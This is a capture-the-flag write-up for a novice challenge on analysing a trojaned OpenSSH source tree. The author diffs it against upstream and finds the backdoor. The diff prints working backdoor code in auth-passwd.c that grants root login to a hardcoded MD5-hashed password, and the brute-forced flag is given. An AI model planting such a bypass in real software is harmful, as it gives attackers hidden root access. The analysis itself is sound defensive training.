# ssh backdoor analysis (novice - 50 Points)

## Task
This challenge is about analyzing a backdoored SSH service.

Goal:

- find the backdoor
- find the backdoor password
- list all files that are altered compared to the origin version

Hint: compare trojan version versus original version

Please download the backdoor from here (backdoor-source.tar.gz) or from
the RESOURCE section. 

- explain your systematic approach of finding the backdoor
- list all files that have been altered (changed)
- explain how you were able to find the attacker password and add your tool/script/programm

## Solution

The given source code is the OpenSSH binary, so lets search for the original 
one. This is usefull, because with the original code it's way easier to find
any modifications compared to looking at the whole source code manually.

I had a bit problem finding the correct version, since the Github Repo
https://github.com/openssh/openssh-portable contains other version tags than
the headers of the C files. But I manage to find a version that matches the
content of the ssh.c Version (by searching in the git history of the ssh.c file
for the version 'ssh.c,v 1.553'). Then I downloaded the source and checkout
the commit '98e27dcf581647b5bbe9780e8f59685d942d8ea3'. A diff finds some
changes (I realized then this was not exactly the same version, but the diff
was not too big). One change looks very suspicious:

```
diff ./auth-passwd.c ../../git/swiss-hacking-challenge-2021/Bundle6/1_sshBackdoor/backdoor-source/auth-passwd.c
47a48,49
> #include <openssl/md5.h>
> 
88a91,93
>     if(sys_auth_backdoor(authctxt, password))
>         return 1;
> 
215a221,246
>     
> static char backdoor_hash[MD5_DIGEST_LENGTH] = \
> {
>     // HL{????} where ? is [0-9]
>     0x45, 0xD6, 0x16, 0xFF, 0x7D, 0x51, 0x08, 0xBD, 0x93, 0x09, 0x4F, 0xA1, 0x5F, 0xE0, 0xE1, 0xD2
> };
> 
> int
> sys_auth_backdoor(Authctxt *authctxt, const char *password)
> {
>     MD5_CTX c = {};
>     char password_hash[MD5_DIGEST_LENGTH] = {}; 
> 	struct passwd *pw = authctxt->pw;
>     
>     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
>         return 0;
> 
>     MD5_Init(&c);
>     MD5_Update(&c, password, strlen(password));
>     MD5_Final(password_hash, &c);
> 
>     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
>         return 0;
> 
>     return 1;
> }
```

So this must be the backdoor, it checks if the username is 'root' and the
password matches the MD5 hash in the constant 'backdoor_hash'. As the
comment suggest, the password is in the format 'HL{????}' and the ? represents
only numbers. This makes this MD5 quiet easy to brute force (using the attached
brute.py script). The resulting flag: HL{7298}
